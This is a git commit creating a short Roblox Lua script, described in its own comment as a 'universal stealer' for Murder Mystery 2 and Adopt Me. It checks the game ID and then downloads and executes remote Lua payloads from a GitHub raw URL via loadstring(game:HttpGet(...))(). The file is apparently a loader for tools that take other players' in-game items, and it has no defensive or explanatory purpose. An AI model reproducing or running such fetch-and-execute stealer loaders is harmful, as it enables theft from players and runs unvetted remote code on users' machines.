d9350fffa3d88b37d7ad8e7f4af1420db898997e
AzureScript3 <126334041+AzureScript3@users.noreply.github.com>
2024-10-02 22:30:13 +0800

    Create exc.lua

---
+++ exc.lua
@@ -0,0 +1,12 @@
+-- better x scripts universal stealer 
+-- supported games: mm2, adopt me
+
+-- adopt me
+if game.GameId == 383310974 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Ethereal/main/adm.lua"))()
+end
+
+-- mm2
+if game.GameId == 66654135 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Ethereal/main/mm2.lua"))()
+end
